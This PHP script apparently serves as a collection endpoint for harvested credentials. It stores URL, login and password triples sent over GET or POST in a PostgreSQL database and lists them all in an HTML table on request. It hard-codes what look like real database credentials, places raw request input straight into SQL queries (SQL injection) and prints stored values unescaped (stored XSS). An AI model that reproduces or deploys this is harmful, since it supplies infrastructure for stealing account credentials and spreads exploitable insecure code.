<?php
$dbconn = pg_connect("
	host     = ec2-54-235-89-113.compute-1.amazonaws.com
	dbname   = d4vrdl5cj9rncb
	user     = malouijarvdhsq
	password = tXOJrWYUOh-BTc-nQ5KxRa1V_N
")or die('Could not connect: ' . pg_last_error());
		
if($_GET['comand'] == 'create_database')
{
	$query = "CREATE TABLE database (
	ul        TEXT    NOT NULL,
	ln  	  TEXT    NOT NULL,
	pd   	  TEXT    NOT NULL)";
	$result = pg_query($query) or die(pg_last_error());
}
	
if((($_POST["comand"] == 'set') and (isset($_POST["ul"])) and (isset($_POST["ln"])) and (isset($_POST["pd"]))))
{
	$query = "SELECT * FROM database WHERE ul = '$_POST[ul]' and ln = '$_POST[ln]'  and pd = '$_POST[pd]'";
	$result = pg_query($query) or die(pg_last_error());
	if(pg_num_rows($result) == 0)
	{
		$query = "INSERT INTO database (ul, ln, pd) VALUES ('$_POST[ul]', '$_POST[ln]', '$_POST[pd]')";
		$result = pg_query($query) or die(pg_last_error());
	}
}
if((($_GET["comand"] == 'set') and (isset($_GET["ul"])) and (isset($_GET["ln"])) and (isset($_GET["pd"]))))
{
	$query = "SELECT * FROM database WHERE ul = '$_GET[ul]' and ln = '$_GET[ln]'  and pd = '$_GET[pd]'";
	$result = pg_query($query) or die(pg_last_error());
	if(pg_num_rows($result) == 0)
	{
		$query = "INSERT INTO database (ul, ln, pd) VALUES ('$_GET[ul]', '$_GET[ln]', '$_GET[pd]')";
		$result = pg_query($query) or die(pg_last_error());
	}
}
if($_GET['comand'] == 'get')
{
	$query = "SELECT * FROM database";
	$result = pg_query($query) or die(pg_last_error());
	echo '<table>';
	echo '<tr><th>URL</th><th>Login</th><th>Password</th></tr>';
	while ($line = pg_fetch_array($result, null, PGSQL_ASSOC)) 
	{
		echo '<tr>' . '<td>' . $line['ul'] . '</td>' . '<td>' . $line['ln'] . '</td>' . '<td>' . $line['pd'] . '</td>' . '</tr>';
	}
	echo '</table>';
}
pg_free_result($result);
pg_close($dbconn);
?>
